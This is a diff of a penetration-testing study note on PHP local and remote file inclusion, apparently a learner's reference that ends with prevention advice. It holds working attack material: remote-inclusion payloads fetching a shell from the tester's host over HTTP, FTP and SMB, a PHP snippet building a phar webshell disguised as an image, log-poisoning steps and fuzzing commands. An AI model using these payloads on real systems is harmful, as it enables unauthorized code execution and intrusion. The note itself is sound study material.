@@ -1,8 +1,8 @@
 # File Inclusion
 
-> Status: 🟨 In progress (sections 1–5 of 11 audited; rest already covered)
+> Status: ✅ Complete (reference; sections 10–11 are exercises/skills lab)
 > Date started: 2026-10-26
-> Date finished: 
+> Date finished: 2026-10-27
 
 ## 1. Goal
 Abuse a parameter that includes a file (`?page=`, `?lang=`) to read local files (**LFI**), disclose source, or get code execution. Remote inclusion (**RFI**) pulls a file from your server when `allow_url_include` is on.
@@ -82,14 +82,21 @@ If the include allows a remote URL (`allow_url_include = On`), host your payload
 ?lang=ftp://<me>/shell.php           # FTP (pyftpdlib) — WAF bypass
 ?lang=\\<me>\share\shell.php         # SMB UNC (impacket smbserver) — Windows, internal
 ```
-Test first with `?lang=http://127.0.0.1/` to confirm remote fetch works.
+Test first with `?lang=http://127.0.0.1/` to confirm remote fetch works (don't include the vulnerable page itself → recursion DoS). **LFI ≠ RFI** always: RFI needs the function to allow remote URLs, you to control the whole wrapper (not just part of the filename), and the config to permit it. FTP with creds if anonymous is off: `ftp://user:pass@<me>/shell.php`. **SMB on a Windows target needs no `allow_url_include`** — Windows treats the UNC path as a normal file (best on the same network).
 
 ## LFI → RCE paths
 - **PHP filter source disclosure** → read config/source → find creds or the next bug.
 - **Upload + LFI** (when upload exists but doesn't execute): embed PHP in a file the server stores, then LFI it:
   - **Image**: valid magic bytes (`GIF89a;`) + PHP appended, upload as `.gif`, LFI the path.
   - **zip://**: upload a zip containing a PHP shell → `?lang=zip://uploaded.zip%23shell.php` (needs zip ext).
-  - **phar://**: pack PHP in a phar → `?lang=phar://uploaded.phar/shell` (needs phar ext).
+  - **phar://**: build a phar that writes a shell sub-file, rename to `.jpg`, upload → `?lang=phar://./uploads/shell.jpg%2Fshell.txt&cmd=id`:
+    ```php
+    $phar = new Phar('shell.phar'); $phar->startBuffering();
+    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+    $phar->setStub('<?php __HALT_COMPILER(); ?>'); $phar->stopBuffering();
+    ```
+    `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
+  - Image is the most reliable of the three (zip/phar need the extension loaded).
 - **Log poisoning** (need read access to the log):
   - **Server logs**: poison `User-Agent` (or any logged header) with PHP → LFI `access.log` (Apache `/var/log/apache2/access.log`, Nginx) → executes. (Webshell not stored here.)
   - **PHP session**: put PHP in a controllable session var → LFI the session file (`/var/lib/php/sessions/sess_<PHPSESSID>`).
@@ -107,6 +114,8 @@ ffuf -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://t/index.php?languag
 ffuf -w SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://t/?language=../../../../FUZZ/index.php' -fs <baseline>
 ```
 Tools (mostly dated, Python2): LFISuite, liffy, LFiFreak — verify results manually. **Automated scanning never replaces manual testing**; complex bypasses/WAF evasion need hand-crafted payloads.
+
+**Manual config→path enumeration chain** (when you need the real webroot/log paths): read `/etc/apache2/apache2.conf` → gives `DocumentRoot /var/www/html` + `CustomLog ${APACHE_LOG_DIR}/access.log`; then read `/etc/apache2/envvars` → resolves `APACHE_LOG_DIR=/var/log/apache2`. Precise LFI wordlists (LFI-WordList-Linux/Windows) find far more config/log paths than LFI-Jhaddix alone. The webroot lets you switch from fragile relative paths to absolute paths for uploaded files.
 
 ## Fix / prevention
 - **Best defense: don't put user input into include paths.** Load assets by a fixed map, not a parameter.
